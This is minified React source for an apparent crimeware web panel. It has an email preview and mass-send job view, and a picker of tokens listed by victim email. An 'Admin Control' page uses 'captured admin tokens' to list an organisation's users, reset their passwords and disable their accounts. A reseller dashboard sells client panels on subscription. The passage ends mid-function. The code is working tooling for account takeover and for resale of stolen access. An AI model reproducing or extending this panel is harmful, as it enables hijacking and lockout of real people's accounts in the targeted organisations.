function Hs({ html: e, subject: t, onClose: n }) {
  return (0, R.jsxs)(Sa, {
    open: !0,
    title: `Email Preview`,
    onClose: n,
    width: `max-w-2xl`,
    children: [
      t &&
        (0, R.jsxs)(`div`, {
          className: `px-4 py-2 bg-bg-muted/40 border-b border-border text-xs text-text-muted`,
          children: [
            (0, R.jsx)(`span`, {
              className: `font-medium text-text-primary`,
              children: `Subject:`,
            }),
            ` `,
            (0, R.jsx)(`span`, {
              className: `text-text-secondary`,
              children: t,
            }),
          ],
        }),
      e
        ? (0, R.jsx)(`div`, {
            className: `bg-white text-black p-4 min-h-[200px] max-h-[500px] overflow-auto text-sm`,
            dangerouslySetInnerHTML: { __html: e },
          })
        : (0, R.jsx)(`div`, {
            className: `text-center py-8 text-text-muted text-sm`,
            children: `No content to preview.`,
          }),
    ],
  });
}
function Us({ job: e, onClose: t }) {
  return (0, R.jsx)(Sa, {
    open: !0,
    title: `Job #${e.job_id}`,
    onClose: t,
    width: `max-w-lg`,
    children: (0, R.jsxs)(`div`, {
      className: `space-y-4`,
      children: [
        (0, R.jsxs)(`div`, {
          className: `grid grid-cols-2 gap-3`,
          children: [
            (0, R.jsx)(Js, { label: `Status`, value: e.status.toUpperCase() }),
            (0, R.jsx)(Js, { label: `Progress`, value: `${e.progress_pct}%` }),
            (0, R.jsx)(Js, { label: `Sent`, value: `${e.sent} / ${e.total}` }),
            (0, R.jsx)(Js, { label: `Failed`, value: String(e.failed) }),
            (0, R.jsx)(Js, { label: `Delay`, value: `${e.delay}s` }),
            (0, R.jsx)(Js, {
              label: `Created`,
              value: e.created_at
                ? new Date(e.created_at).toLocaleString()
                : `—`,
            }),
            e.started_at &&
              (0, R.jsx)(Js, {
                label: `Started`,
                value: new Date(e.started_at).toLocaleString(),
              }),
            e.completed_at &&
              (0, R.jsx)(Js, {
                label: `Completed`,
                value: new Date(e.completed_at).toLocaleString(),
              }),
          ],
        }),
        e.errors.length > 0 &&
          (0, R.jsxs)(`div`, {
            children: [
              (0, R.jsxs)(`div`, {
                className: `text-[10px] text-text-muted uppercase tracking-wider font-bold mb-1`,
                children: [`Recent Errors (`, e.errors.length, `)`],
              }),
              (0, R.jsx)(`div`, {
                className: `bg-bg border border-border max-h-40 overflow-auto p-2 space-y-1`,
                children: e.errors.map((e, t) =>
                  (0, R.jsx)(
                    `div`,
                    { className: `text-xs text-danger font-mono`, children: e },
                    t,
                  ),
                ),
              }),
            ],
          }),
      ],
    }),
  });
}
function Ws({ tokens: e, selected: t, onSelect: n }) {
  let [r, i] = (0, _.useState)(!1),
    [a, o] = (0, _.useState)(``),
    s = e.find((e) => e.id === t),
    c = e.filter((e) => e.user_email.toLowerCase().includes(a.toLowerCase()));
  return (0, R.jsxs)(`div`, {
    className: `relative`,
    children: [
      (0, R.jsxs)(`button`, {
        onClick: () => i(!r),
        className: `flex items-center gap-2 bg-bg border border-border px-3 py-2 text-sm cursor-pointer hover:border-border-light transition-colors w-full`,
        children: [
          (0, R.jsx)(`span`, {
            className: `truncate flex-1 text-left`,
            children: s?.user_email ?? `Select token...`,
          }),
          (0, R.jsx)(Mr, {
            size: 14,
            className: `text-text-muted transition-transform ${r ? `rotate-180` : ``}`,
          }),
        ],
      }),
      r &&
        (0, R.jsxs)(`div`, {
          className: `absolute left-0 top-full mt-1 w-full bg-surface border border-border z-30 shadow-lg`,
          children: [
            (0, R.jsxs)(`div`, {
              className: `flex items-center gap-2 px-3 py-2 border-b border-border`,
              children: [
                (0, R.jsx)(xi, {
                  size: 12,
                  className: `text-text-muted shrink-0`,
                }),
                (0, R.jsx)(`input`, {
                  type: `text`,
                  value: a,
                  onChange: (e) => o(e.target.value),
                  placeholder: `Search emails...`,
                  className: `flex-1 bg-transparent text-sm text-text outline-none placeholder:text-text-muted`,
                  autoFocus: !0,
                }),
              ],
            }),
            (0, R.jsx)(`div`, {
              className: `max-h-48 overflow-y-auto`,
              children:
                c.length === 0
                  ? (0, R.jsxs)(`div`, {
                      className: `px-3 py-3 text-xs text-text-muted text-center`,
                      children: [`No tokens match "`, a, `"`],
                    })
                  : c.map((e) =>
                      (0, R.jsx)(
                        `button`,
                        {
                          onClick: () => {
                            (n(e.id), i(!1), o(``));
                          },
                          className: `w-full text-left px-3 py-2 text-sm hover:bg-surface-hover cursor-pointer transition-colors ${e.id === t ? `bg-slate-100 text-slate-900` : `text-text-secondary`}`,
                          children: e.user_email,
                        },
                        e.id,
                      ),
                    ),
            }),
          ],
        }),
    ],
  });
}
function Gs({ active: e, onClick: t, children: n }) {
  return (0, R.jsx)(`button`, {
    onClick: t,
    className: `px-4 py-2 text-xs font-semibold uppercase tracking-wider transition-colors cursor-pointer ${e ? `text-slate-900 border-b-2 border-slate-800` : `text-text-muted hover:text-text border-b-2 border-transparent`}`,
    children: n,
  });
}
function Ks({ status: e }) {
  let t = {
      done: { color: `success`, icon: (0, R.jsx)(Ir, { size: 10 }) },
      completed: { color: `success`, icon: (0, R.jsx)(Ir, { size: 10 }) },
      completed_with_errors: {
        color: `warning`,
        icon: (0, R.jsx)(L, { size: 10 }),
      },
      running: {
        color: `warning`,
        icon: (0, R.jsx)(ci, { size: 10, className: `animate-spin` }),
      },
      paused: { color: `muted`, icon: (0, R.jsx)(hi, { size: 10 }) },
      queued: { color: `muted`, icon: (0, R.jsx)(zr, { size: 10 }) },
      cancelled: { color: `muted`, icon: (0, R.jsx)(Rr, { size: 10 }) },
      failed: { color: `danger`, icon: (0, R.jsx)(L, { size: 10 }) },
    },
    n = t[e] ?? t.queued;
  return (0, R.jsx)(la, {
    color: n.color,
    children: (0, R.jsxs)(`span`, {
      className: `flex items-center gap-1`,
      children: [n.icon, ` `, e],
    }),
  });
}
function qs({ label: e, value: t }) {
  return (0, R.jsxs)(`div`, {
    className: `flex justify-between`,
    children: [
      (0, R.jsx)(`span`, { className: `text-text-muted`, children: e }),
      (0, R.jsx)(`span`, {
        className: `text-text font-medium truncate ml-2`,
        children: t,
      }),
    ],
  });
}
function Js({ label: e, value: t }) {
  return (0, R.jsxs)(`div`, {
    children: [
      (0, R.jsx)(`div`, {
        className: `text-[10px] text-text-muted uppercase tracking-widest mb-0.5`,
        children: e,
      }),
      (0, R.jsx)(`div`, {
        className: `text-sm text-text font-medium`,
        children: t,
      }),
    ],
  });
}
function Ys({ v: e, desc: t, color: n }) {
  return (0, R.jsxs)(`span`, {
    className: `inline-flex items-center gap-1 px-1.5 py-0.5 border rounded cursor-default ${n === `emerald` ? `border-emerald-400/30 text-emerald-400` : `border-blue-400/30 text-blue-400`}`,
    title: t,
    children: [
      (0, R.jsx)(`code`, { className: `text-[10px]`, children: e }),
      (0, R.jsx)(`span`, {
        className: `text-text-muted text-[9px]`,
        children: t,
      }),
    ],
  });
}
async function Xs() {
  return P(`/dash/mfa/scan`, { method: `POST` });
}
async function Zs() {
  return P(`/dash/mfa/cached`);
}
async function Qs(e, t) {
  let n = new URLSearchParams();
  return (t && n.set(`q`, t), P(`/dash/mfa/${e}/org-users?${n}`));
}
async function $s(e, t, n) {
  return P(`/dash/mfa/${e}/user/${t}/reset-password`, {
    method: `POST`,
    body: JSON.stringify(n ?? {}),
  });
}
async function ec(e, t, n) {
  return P(`/dash/mfa/${e}/user/${t}/toggle`, {
    method: `POST`,
    body: JSON.stringify({ enabled: n }),
  });
}
function tc() {
  let [e, t] = (0, _.useState)([]),
    [n, r] = (0, _.useState)(!0),
    [i, a] = (0, _.useState)(!1),
    [o, s] = (0, _.useState)(null),
    c = z((e) => e.add);
  (0, _.useEffect)(() => {
    l();
  }, []);
  async function l() {
    r(!0);
    try {
      t((await Zs()).results ?? []);
    } catch {
      c(`Failed to load admin captures`, `error`);
    } finally {
      r(!1);
    }
  }
  async function u() {
    a(!0);
    try {
      let e = await Xs();
      (t(e.results ?? []), c(`Scanned ${e.scanned} tokens`, `success`));
    } catch {
      c(`Scan failed`, `error`);
    } finally {
      a(!1);
    }
  }
  return (0, R.jsxs)(`div`, {
    children: [
      (0, R.jsxs)(`div`, {
        className: `flex items-center justify-between mb-5`,
        children: [
          (0, R.jsxs)(`div`, {
            children: [
              (0, R.jsx)(`h1`, {
                className: `text-lg font-bold tracking-wider uppercase`,
                children: `Admin Control`,
              }),
              (0, R.jsx)(`p`, {
                className: `text-xs text-text-muted mt-1`,
                children: `Manage org users from captured admin tokens`,
              }),
            ],
          }),
          (0, R.jsx)(V, {
            onClick: u,
            disabled: i,
            children: (0, R.jsxs)(`span`, {
              className: `flex items-center gap-1.5`,
              children: [
                i
                  ? (0, R.jsx)(si, { size: 14, className: `animate-spin` })
                  : (0, R.jsx)(bi, { size: 14 }),
                i ? `Scanning...` : `Scan Tokens`,
              ],
            }),
          }),
        ],
      }),
      n
        ? (0, R.jsx)(`div`, {
            className: `text-text-muted text-sm py-12 text-center`,
            children: `Loading cached admin captures...`,
          })
        : e.length === 0
          ? (0, R.jsxs)(`div`, {
              className: `bg-surface border border-border flex flex-col items-center justify-center py-16`,
              children: [
                (0, R.jsx)(Ti, {
                  size: 32,
                  strokeWidth: 1.5,
                  className: `text-text-muted`,
                }),
                (0, R.jsx)(`p`, {
                  className: `text-sm text-text-muted mt-4`,
                  children: `No admin captures found.`,
                }),
                (0, R.jsx)(`p`, {
                  className: `text-xs text-text-muted/70 mt-1`,
                  children: `Click "Scan Tokens" to check captured accounts for admin privileges.`,
                }),
              ],
            })
          : (0, R.jsx)(`div`, {
              className: `space-y-3`,
              children: e.map((e) =>
                (0, R.jsx)(
                  `button`,
                  {
                    onClick: () => s(e),
                    className: `w-full text-left bg-surface border p-4 transition-colors cursor-pointer ${o?.id === e.id ? `border-active` : `border-border hover:border-border-light`}`,
                    children: (0, R.jsxs)(`div`, {
                      className: `flex items-center justify-between`,
                      children: [
                        (0, R.jsxs)(`div`, {
                          children: [
                            (0, R.jsx)(`div`, {
                              className: `text-[13px] font-medium text-text`,
                              children: e.email,
                            }),
                            e.name &&
                              (0, R.jsx)(`div`, {
                                className: `text-[11px] text-text-muted`,
                                children: e.name,
                              }),
                          ],
                        }),
                        (0, R.jsx)(`div`, {
                          className: `flex gap-1 flex-wrap justify-end`,
                          children: e.roles.map((e) =>
                            (0, R.jsx)(
                              la,
                              {
                                color: `success`,
                                children: e
                                  .replace(`Directory.`, ``)
                                  .replace(`Role.`, ``),
                              },
                              e,
                            ),
                          ),
                        }),
                      ],
                    }),
                  },
                  e.id,
                ),
              ),
            }),
      o && (0, R.jsx)(nc, { tokenId: o.id, account: o.email }),
    ],
  });
}
function nc({ tokenId: e, account: t }) {
  let [n, r] = (0, _.useState)([]),
    [i, a] = (0, _.useState)(!0),
    [o, s] = (0, _.useState)(``),
    [c, l] = (0, _.useState)(null),
    [u, d] = (0, _.useState)(``),
    [f, p] = (0, _.useState)(!1),
    m = z((e) => e.add);
  function h(t) {
    (a(!0),
      Qs(e, t)
        .then((e) => r(e.users ?? []))
        .catch(() => m(`Failed to load org users`, `error`))
        .finally(() => a(!1)));
  }
  (0, _.useEffect)(() => {
    h();
  }, [e]);
  async function g(e, t) {
    (d(``), l({ uid: e, name: t }));
  }
  async function v() {
    if (c) {
      p(!0);
      try {
        let t = {};
        u.trim() && ((t.newPassword = u.trim()), (t.forceChange = !1));
        let n = await $s(e, c.uid, t),
          r = u.trim() || n.newPassword;
        (l({ ...c, result: r }),
          navigator.clipboard.writeText(r),
          m(`Password reset — copied to clipboard`, `success`));
      } catch {
        m(`Reset failed`, `error`);
      } finally {
        p(!1);
      }
    }
  }
  async function y(t, n, r) {
    let i = n ? `Disable` : `Enable`;
    if (confirm(`${i} account for ${r}?`))
      try {
        (await ec(e, t, !n),
          m(`Account ${i.toLowerCase()}d`, `success`),
          h(o || void 0));
      } catch {
        m(`Toggle failed`, `error`);
      }
  }
  return (0, R.jsxs)(`div`, {
    className: `mt-5`,
    children: [
      (0, R.jsxs)(`div`, {
        className: `flex items-center justify-between mb-3`,
        children: [
          (0, R.jsxs)(`div`, {
            className: `text-[11px] font-bold uppercase tracking-wider text-text-muted`,
            children: [
              `Org Users — `,
              (0, R.jsx)(`span`, {
                className: `text-text-secondary`,
                children: t,
              }),
            ],
          }),
          (0, R.jsx)(`div`, {
            className: `flex gap-2`,
            children: (0, R.jsxs)(`div`, {
              className: `relative`,
              children: [
                (0, R.jsx)(xi, {
                  size: 12,
                  className: `absolute left-2.5 top-1/2 -translate-y-1/2 text-text-muted`,
                }),
                (0, R.jsx)(`input`, {
                  type: `text`,
                  value: o,
                  onChange: (e) => {
                    (s(e.target.value),
                      clearTimeout(window.__mfa_st),
                      (window.__mfa_st = setTimeout(
                        () => h(e.target.value || void 0),
                        400,
                      )));
                  },
                  placeholder: `Search users...`,
                  className: `bg-bg border border-border text-text pl-8 pr-3 py-1.5 text-xs w-48 focus:outline-none focus:border-border-light`,
                }),
              ],
            }),
          }),
        ],
      }),
      i
        ? (0, R.jsx)(`div`, {
            className: `text-sm text-text-muted py-8 text-center`,
            children: `Loading org users...`,
          })
        : n.length === 0
          ? (0, R.jsx)(`div`, {
              className: `text-sm text-text-muted py-8 text-center`,
              children: `No users found`,
            })
          : (0, R.jsx)(`div`, {
              className: `border border-border`,
              children: (0, R.jsxs)(`table`, {
                className: `w-full text-sm`,
                children: [
                  (0, R.jsx)(`thead`, {
                    children: (0, R.jsxs)(`tr`, {
                      className: `border-b border-border bg-surface`,
                      children: [
                        (0, R.jsx)(`th`, {
                          className: `text-left text-[10px] text-text-muted uppercase tracking-wider py-2 px-3 font-bold`,
                          children: `Name`,
                        }),
                        (0, R.jsx)(`th`, {
                          className: `text-left text-[10px] text-text-muted uppercase tracking-wider py-2 px-3 font-bold`,
                          children: `Email`,
                        }),
                        (0, R.jsx)(`th`, {
                          className: `text-center text-[10px] text-text-muted uppercase tracking-wider py-2 px-3 font-bold`,
                          children: `Status`,
                        }),
                        (0, R.jsx)(`th`, {
                          className: `text-right text-[10px] text-text-muted uppercase tracking-wider py-2 px-3 font-bold`,
                          children: `Actions`,
                        }),
                      ],
                    }),
                  }),
                  (0, R.jsx)(`tbody`, {
                    children: n.map((e) =>
                      (0, R.jsxs)(
                        `tr`,
                        {
                          className: `border-b border-border/40 hover:bg-slate-50`,
                          children: [
                            (0, R.jsxs)(`td`, {
                              className: `py-2.5 px-3`,
                              children: [
                                (0, R.jsx)(`div`, {
                                  className: `text-[12px] font-medium`,
                                  children: e.displayName,
                                }),
                                e.jobTitle &&
                                  (0, R.jsx)(`div`, {
                                    className: `text-[10px] text-text-muted`,
                                    children: e.jobTitle,
                                  }),
                              ],
                            }),
                            (0, R.jsx)(`td`, {
                              className: `py-2.5 px-3 text-[11px] text-text-muted font-mono truncate max-w-[220px]`,
                              children: e.mail || e.userPrincipalName,
                            }),
                            (0, R.jsx)(`td`, {
                              className: `py-2.5 px-3 text-center`,
                              children: (0, R.jsx)(la, {
                                status: e.accountEnabled
                                  ? `active`
                                  : `suspended`,
                                label: e.accountEnabled ? `Active` : `Disabled`,
                              }),
                            }),
                            (0, R.jsx)(`td`, {
                              className: `py-2.5 px-3`,
                              children: (0, R.jsxs)(`div`, {
                                className: `flex gap-1.5 justify-end`,
                                children: [
                                  (0, R.jsxs)(`button`, {
                                    onClick: () => g(e.id, e.displayName),
                                    title: `Reset Password`,
                                    className: `flex items-center gap-1 px-2 py-1 text-[10px] font-semibold uppercase tracking-wider cursor-pointer transition-colors text-text-secondary hover:text-slate-900 hover:bg-slate-100`,
                                    children: [
                                      (0, R.jsx)(ni, { size: 11 }),
                                      ` Reset`,
                                    ],
                                  }),
                                  (0, R.jsx)(`button`, {
                                    onClick: () =>
                                      y(e.id, e.accountEnabled, e.displayName),
                                    title: e.accountEnabled
                                      ? `Disable Account`
                                      : `Enable Account`,
                                    className: `flex items-center gap-1 px-2 py-1 text-[10px] font-semibold uppercase tracking-wider cursor-pointer transition-colors text-text-secondary ${e.accountEnabled ? `hover:text-danger hover:bg-danger/10` : `hover:text-active hover:bg-active/10`}`,
                                    children: e.accountEnabled
                                      ? (0, R.jsxs)(R.Fragment, {
                                          children: [
                                            (0, R.jsx)(Vi, { size: 11 }),
                                            ` Disable`,
                                          ],
                                        })
                                      : (0, R.jsxs)(R.Fragment, {
                                          children: [
                                            (0, R.jsx)(Ri, { size: 11 }),
                                            ` Enable`,
                                          ],
                                        }),
                                  }),
                                ],
                              }),
                            }),
                          ],
                        },
                        e.id,
                      ),
                    ),
                  }),
                ],
              }),
            }),
      c &&
        (0, R.jsx)(Sa, {
          open: !0,
          title: `Reset Password — ${c.name}`,
          onClose: () => l(null),
          width: `max-w-sm`,
          children: c.result
            ? (0, R.jsxs)(`div`, {
                className: `space-y-3`,
                children: [
                  (0, R.jsxs)(`div`, {
                    className: `bg-active/10 border border-active/25 p-3 text-center`,
                    children: [
                      (0, R.jsx)(`p`, {
                        className: `text-xs text-text-muted mb-1`,
                        children: `New Password (copied to clipboard)`,
                      }),
                      (0, R.jsxs)(`div`, {
                        className: `flex items-center justify-center gap-2`,
                        children: [
                          (0, R.jsx)(`span`, {
                            className: `text-sm font-mono font-bold text-active`,
                            children: c.result,
                          }),
                          (0, R.jsx)(`button`, {
                            onClick: () =>
                              navigator.clipboard.writeText(c.result),
                            className: `text-text-muted hover:text-slate-900 cursor-pointer`,
                            children: (0, R.jsx)(Ur, { size: 12 }),
                          }),
                        ],
                      }),
                    ],
                  }),
                  (0, R.jsx)(V, {
                    variant: `secondary`,
                    onClick: () => l(null),
                    className: `w-full`,
                    children: `Close`,
                  }),
                ],
              })
            : (0, R.jsxs)(`div`, {
                className: `space-y-3`,
                children: [
                  (0, R.jsx)(`p`, {
                    className: `text-xs text-text-muted`,
                    children: `Set a custom password or leave blank to generate a random one.`,
                  }),
                  (0, R.jsxs)(`div`, {
                    children: [
                      (0, R.jsx)(`label`, {
                        className: `text-[10px] text-text-muted uppercase tracking-wider font-bold block mb-1`,
                        children: `New Password`,
                      }),
                      (0, R.jsx)(`input`, {
                        type: `text`,
                        value: u,
                        onChange: (e) => d(e.target.value),
                        placeholder: `Leave blank for random password`,
                        className: `w-full bg-bg border border-border text-text px-3 py-2 text-sm font-mono focus:outline-none focus:border-border-light`,
                      }),
                    ],
                  }),
                  (0, R.jsxs)(`div`, {
                    className: `flex gap-2`,
                    children: [
                      (0, R.jsx)(V, {
                        onClick: v,
                        disabled: f,
                        className: `flex-1`,
                        children: f
                          ? `Resetting...`
                          : u.trim()
                            ? `Set Password`
                            : `Generate Random`,
                      }),
                      (0, R.jsx)(V, {
                        variant: `secondary`,
                        onClick: () => l(null),
                        className: `flex-1`,
                        children: `Cancel`,
                      }),
                    ],
                  }),
                ],
              }),
        }),
    ],
  });
}
async function rc() {
  return P(`/agent/dashboard`);
}
async function ic() {
  return P(`/agent/clients`);
}
async function ac(e) {
  return P(`/agent/clients/create`, {
    method: `POST`,
    body: JSON.stringify(e),
  });
}
async function oc(e, t) {
  return P(`/agent/clients/${e}/update`, {
    method: `POST`,
    body: JSON.stringify(t),
  });
}
async function sc(e, t) {
  return P(`/agent/clients/${e}/extend`, {
    method: `POST`,
    body: JSON.stringify({ days: t }),
  });
}
function cc({ icon: e, label: t, value: n, sub: r }) {
  return (0, R.jsxs)(`div`, {
    className: `bg-surface border border-border p-5`,
    children: [
      (0, R.jsxs)(`div`, {
        className: `flex items-center gap-2 text-text-muted mb-3`,
        children: [
          e,
          (0, R.jsx)(`span`, {
            className: `text-[10px] uppercase tracking-wider font-bold`,
            children: t,
          }),
        ],
      }),
      (0, R.jsx)(`div`, {
        className: `text-2xl font-bold text-text tracking-wide`,
        children: n,
      }),
      r &&
        (0, R.jsx)(`div`, {
          className: `text-[11px] text-text-muted mt-1`,
          children: r,
        }),
    ],
  });
}
function lc() {
  let [e, t] = (0, _.useState)(null),
    [n, r] = (0, _.useState)(!0),
    i = z((e) => e.add);
  (0, _.useEffect)(() => {
    rc()
      .then(t)
      .catch(() => i(`Failed to load agent dashboard`, `error`))
      .finally(() => r(!1));
  }, []);
  function a(e) {
    (navigator.clipboard.writeText(e), i(`URL copied`, `success`));
  }
  return n
    ? (0, R.jsx)(`div`, {
        className: `text-text-muted text-sm py-12 text-center`,
        children: `Loading agent dashboard...`,
      })
    : e
      ? (0, R.jsxs)(`div`, {
          children: [
            (0, R.jsxs)(`div`, {
              className: `mb-5`,
              children: [
                (0, R.jsx)(`h1`, {
                  className: `text-lg font-bold tracking-wider uppercase`,
                  children: `Agent Dashboard`,
                }),
                (0, R.jsx)(`p`, {
                  className: `text-xs text-text-muted mt-1`,
                  children: `Manage your reseller panel and clients`,
                }),
              ],
            }),
            (0, R.jsxs)(`div`, {
              className: `grid grid-cols-2 lg:grid-cols-4 gap-3 mb-6`,
              children: [
                (0, R.jsx)(cc, {
                  icon: (0, R.jsx)(Ui, { size: 14 }),
                  label: `Clients`,
                  value: e.client_count,
                  sub: `${e.max_free_clients} free slots`,
                }),
                (0, R.jsx)(cc, {
                  icon: (0, R.jsx)(Gi, { size: 14 }),
                  label: `Balance`,
                  value: `$${e.balance.toFixed(2)}`,
                  sub: `$${e.cost_per_client}/client`,
                }),
                (0, R.jsx)(cc, {
                  icon: (0, R.jsx)(Wr, { size: 14 }),
                  label: `Total Paid`,
                  value: `$${e.total_paid.toFixed(2)}`,
                }),
                (0, R.jsx)(cc, {
                  icon: (0, R.jsx)(ai, { size: 14 }),
                  label: `Panel`,
                  value: e.panel_name || e.slug,
                }),
              ],
            }),
            e.panel_url &&
              (0, R.jsxs)(`div`, {
                className: `bg-surface border border-border p-4`,
                children: [
                  (0, R.jsx)(`div`, {
                    className: `text-[10px] text-text-muted uppercase tracking-wider font-bold mb-2`,
                    children: `Your Panel URL`,
                  }),
                  (0, R.jsxs)(`div`, {
                    className: `flex items-center gap-2`,
                    children: [
                      (0, R.jsx)(`code`, {
                        className: `flex-1 text-sm text-text font-mono bg-bg border border-border px-3 py-2 truncate`,
                        children: e.panel_url,
                      }),
                      (0, R.jsx)(`button`, {
                        onClick: () => a(e.panel_url),
                        className: `text-text-muted hover:text-slate-900 transition-colors cursor-pointer p-2`,
                        children: (0, R.jsx)(Ur, { size: 14 }),
                      }),
                      (0, R.jsx)(`a`, {
                        href: e.panel_url,
                        target: `_blank`,
                        rel: `noopener noreferrer`,
                        className: `text-text-muted hover:text-slate-900 transition-colors p-2`,
                        children: (0, R.jsx)(Kr, { size: 14 }),
                      }),
                    ],
                  }),
                ],
              }),
          ],
        })
      : (0, R.jsx)(`div`, {
          className: `bg-surface border border-border flex flex-col items-center justify-center py-16`,
          children: (0, R.jsx)(`p`, {
            className: `text-sm text-text-muted`,
            children: `Agent profile not found. Contact admin.`,
          }),
        });
}
function uc() {
  let [e, t] = (0, _.useState)([]),
    [n, r] = (0, _.useState)(!0),
    [i, a] = (0, _.useState)(!1),
    [o, s] = (0, _.useState)(null),
    [c, l] = (0, _.useState)(``),
    u = z((e) => e.add);
  function d() {
    (r(!0),
      ic()
        .then((e) => t(Array.isArray(e) ? e : []))
        .catch(() => u(`Failed to load clients`, `error`))
        .finally(() => r(!1)));
  }
  (0, _.useEffect)(d, []);
  async function f(e) {
    let t = e.status === `active` ? `suspended` : `active`;
    if (confirm(`${t === `suspended` ? `Suspend` : `Activate`} ${e.username}?`))
      try {
        (await oc(e.id, { status: t }), u(`Client ${t}`, `success`), d());
      } catch {
        u(`Update failed`, `error`);
      }
  }
  async function p(e) {
    let t = prompt(`Extend subscription by how many days?`, `30`);
    if (t)
      try {
        (u(
          `Extended to ${(await sc(e.id, parseInt(t))).new_expires?.slice(0, 10)}`,
          `success`,
        ),
          d());
      } catch {
        u(`Extend failed`, `error`);
      }
  }
  let m = e.filter(
    (e) =>
      !c ||
      e.username.toLowerCase().includes(c.toLowerCase()) ||
      e.display_name?.toLowerCase().includes(c.toLowerCase()),
  );
  return (0, R.jsxs)(`div`, {
    children: [
      (0, R.jsxs)(`div`, {
        className: `flex items-center justify-between mb-5`,
        children: [
          (0, R.jsxs)(`div`, {
            children: [
              (0, R.jsx)(`h1`, {
                className: `text-lg font-bold tracking-wider uppercase`,
                children: `Clients`,
              }),
              (0, R.jsxs)(`p`, {
                className: `text-xs text-text-muted mt-1`,
                children: [e.length, ` client`, e.length === 1 ? `` : `s`],
              }),
            ],
          }),
          (0, R.jsx)(V, {
            onClick: () => a(!0),
            children: (0, R.jsxs)(`span`, {
              className: `flex items-center gap-1.5`,
              children: [(0, R.jsx)(_i, { size: 14 }), ` New Client`],
            }),
          }),
        ],
      }),
      (0, R.jsx)(`div`, {
        className: `flex items-center gap-2 mb-4`,
        children: (0, R.jsxs)(`div`, {
          className: `flex-1 relative`,
          children: [
            (0, R.jsx)(xi, {
              size: 14,
              className: `absolute left-3 top-1/2 -translate-y-1/2 text-text-muted`,
            }),
            (0, R.jsx)(`input`, {
              type: `text`,
              value: c,
              onChange: (e) => l(e.target.value),
              placeholder: `Search clients...`,
              className: `w-full bg-bg border border-border text-text pl-9 pr-3 py-2 text-sm focus:outline-none focus:border-border-light`,
            }),
          ],
        }),
      }),
      n
        ? (0, R.jsx)(`div`, {
            className: `text-text-muted text-sm py-12 text-center`,
            children: `Loading...`,
          })
        : (0, R.jsx)(`div`, {
            className: `bg-surface border border-border overflow-x-auto`,
            children: (0, R.jsxs)(`table`, {
              className: `w-full text-sm`,
              children: [
                (0, R.jsx)(`thead`, {
                  children: (0, R.jsxs)(`tr`, {
                    className: `border-b border-border`,
                    children: [
                      (0, R.jsx)(`th`, {
                        className: `text-left text-[10px] text-text-muted uppercase tracking-wider py-3 px-5 font-bold`,
                        children: `Username`,
                      }),
                      (0, R.jsx)(`th`, {
                        className: `text-left text-[10px] text-text-muted uppercase tracking-wider py-3 px-3 font-bold`,
                        children: `Display Name`,
                      }),
                      (0, R.jsx)(`th`, {
                        className: `text-center text-[10px] text-text-muted uppercase tracking-wider py-3 px-3 font-bold`,
                        children: `Status`,
                      }),
                      (0, R.jsx)(`th`, {
                        className: `text-left text-[10px] text-text-muted uppercase tracking-wider py-3 px-3 font-bold`,
                        children: `Expires`,
                      }),
                      (0, R.jsx)(`th`, {
                        className: `text-left text-[10px] text-text-muted uppercase tracking-wider py-3 px-3 font-bold`,
                        children: `Created`,
                      }),
                      (0, R.jsx)(`th`, {
                        className: `text-left text-[10px] text-text-muted uppercase tracking-wider py-3 px-3 font-bold`,
                        children: `Actions`,
                      }),
                    ],
                  }),
                }),
                (0, R.jsx)(`tbody`, {
                  children:
                    m.length === 0
                      ? (0, R.jsx)(`tr`, {
                          children: (0, R.jsx)(`td`, {
                            colSpan: 6,
                            className: `text-center text-text-muted py-12`,
                            children:
                              e.length === 0
                                ? `No clients yet.`
                                : `No clients match your search.`,
                          }),
                        })
                      : m.map((e) =>
                          (0, R.jsxs)(
                            `tr`,
                            {
                              className: `border-b border-border/40 hover:bg-slate-50 transition-colors`,
                              children: [
                                (0, R.jsx)(`td`, {
                                  className: `py-2.5 px-5 text-[12px] font-medium text-text`,
                                  children: e.username,
                                }),
                                (0, R.jsx)(`td`, {
                                  className: `py-2.5 px-3 text-[12px] text-text-muted`,
                                  children: e.display_name || `—`,
                                }),
                                (0, R.jsx)(`td`, {
                                  className: `py-2.5 px-3 text-center`,
                                  children: (0, R.jsx)(la, {
                                    status: e.status,
                                  }),
                                }),
                                (0, R.jsx)(`td`, {
                                  className: `py-2.5 px-3 text-[11px] text-text-muted font-mono`,
                                  children:
                                    e.subscription_expires?.slice(0, 10) || `—`,
                                }),
                                (0, R.jsx)(`td`, {
                                  className: `py-2.5 px-3 text-[11px] text-text-muted font-mono`,
                                  children: e.created_at?.slice(0, 10) || `—`,
                                }),
                                (0, R.jsx)(`td`, {
                                  className: `py-2 px-3`,
                                  children: (0, R.jsxs)(`div`, {
                                    className: `flex gap-1`,
                                    children: [
                                      (0, R.jsx)(`button`, {
                                        onClick: () => s(e),
                                        className: `flex items-center gap-1 px-2 py-1 text-[10px] font-semibold uppercase tracking-wider cursor-pointer transition-colors text-text-secondary hover:text-slate-900 hover:bg-slate-100`,
                                        title: `Edit`,
                                        children: (0, R.jsx)(zi, { size: 12 }),
                                      }),
                                      (0, R.jsx)(`button`, {
                                        onClick: () => p(e),
                                        className: `flex items-center gap-1 px-2 py-1 text-[10px] font-semibold uppercase tracking-wider cursor-pointer transition-colors text-text-secondary hover:text-slate-900 hover:bg-slate-100`,
                                        title: `Extend Subscription`,
                                        children: (0, R.jsx)(Ar, { size: 12 }),
                                      }),
                                      (0, R.jsx)(`button`, {
                                        onClick: () => f(e),
                                        className: `flex items-center gap-1 px-2 py-1 text-[10px] font-semibold uppercase tracking-wider cursor-pointer transition-colors ${e.status === `active` ? `text-text-secondary hover:text-danger hover:bg-danger/10` : `text-text-secondary hover:text-active hover:bg-active/10`}`,
                                        title:
                                          e.status === `active`
                                            ? `Suspend`
                                            : `Activate`,
                                        children:
                                          e.status === `active`
                                            ? (0, R.jsx)(Vi, { size: 12 })
                                            : (0, R.jsx)(Ri, { size: 12 }),
                                      }),
                                    ],
                                  }),
                                }),
                              ],
                            },
                            e.id,
                          ),
                        ),
                }),
              ],
            }),
          }),
      i &&
        (0, R.jsx)(dc, {
          onClose: () => a(!1),
          onCreated: () => {
            (a(!1), d());
          },
        }),
      o &&
        (0, R.jsx)(fc, {
          client: o,
          onClose: () => s(null),
          onSaved: () => {
            (s(null), d());
          },
        }),
    ],
  });
}
function dc({ onClose: e, onCreated: t }) {
  let [n, r] = (0, _.useState)(``),
    [i, a] = (0, _.useState)(``),
    [o, s] = (0, _.useState)(``),
    [c, l] = (0, _.useState)(`30`),
    [u, d] = (0, _.useState)(!1),
    f = z((e) => e.add);
  async function p() {
    if (!n || !i) {
      f(`Username and password required`, `error`);
      return;
    }
    d(!0);
    try {
